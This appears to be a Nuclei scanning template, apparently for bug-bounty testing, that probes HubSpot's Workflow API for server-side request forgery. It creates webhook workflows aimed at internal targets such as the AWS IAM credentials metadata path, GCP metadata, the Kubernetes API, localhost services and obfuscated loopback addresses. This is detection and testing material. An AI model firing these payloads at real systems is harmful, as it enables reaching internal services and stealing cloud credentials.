id: hubspot-workflow-ssrf
info:
  name: HubSpot Workflow SSRF Detection
  author: BBHK Security Team
  severity: high
  description: Detects SSRF vulnerabilities in HubSpot Workflow API webhook functionality
  tags: ssrf,hubspot,workflow,api

variables:
  token: "<YOUR_HUBSPOT_TOKEN>"

http:
  - method: POST
    path:
      - "{{BaseURL}}/automation/v3/workflows"
      - "{{BaseURL}}/automation/v4/workflows"
      - "{{BaseURL}}/automation/v2/workflows"
    
    headers:
      Authorization: "Bearer {{token}}"
      Content-Type: "application/json"
    
    body: |
      {
        "name": "SSRF Test {{rand_int(10000, 99999)}}",
        "actions": [
          {
            "type": "WEBHOOK", 
            "url": "{{ssrf_target}}"
          }
        ]
      }
    
    payloads:
      ssrf_target:
        - "http://169.254.169.254/latest/meta-data/"
        - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        - "http://metadata.google.internal/computeMetadata/v1/"
        - "https://kubernetes.default.svc/api/v1/"
        - "http://localhost:8080/admin"
        - "http://127.0.0.1:22"
        - "http://[::1]:8080"
        - "http://0x7f000001"
        - "http://127.1"
        - "http://internal-api.hubspot.local/"
    
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201
      
      - type: word
        words:
          - "id"
          - "workflow"
        part: body
        condition: and
      
      - type: dsl
        dsl:
          - 'contains(body, "169.254.169.254") || contains(body, "metadata.google") || contains(body, "kubernetes")'
    
    extractors:
      - type: json
        json:
          - '.id'
        name: workflow_id